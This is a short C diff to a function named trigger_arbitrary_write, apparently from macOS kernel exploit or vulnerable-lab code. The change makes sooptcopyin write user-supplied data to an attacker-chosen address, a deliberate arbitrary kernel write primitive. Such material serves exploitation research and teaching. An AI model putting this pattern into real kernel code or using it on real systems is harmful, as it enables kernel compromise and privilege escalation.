@@ -185,7 +185,8 @@ errno_t trigger_arbitrary_write(void *data, size_t data_len)
 	sopt.sopt_valsize   = data_len;
 	sopt.sopt_p         = kernproc;
 
-	sooptcopyin(&sopt, &stuff[0], sopt.sopt_valsize, sopt.sopt_valsize);
+	uint64_t * write_where = (uint64_t *)stuff[0];
+	sooptcopyin(&sopt, write_where, sopt.sopt_valsize, sopt.sopt_valsize);
 
 	return KERN_SUCCESS;
 }
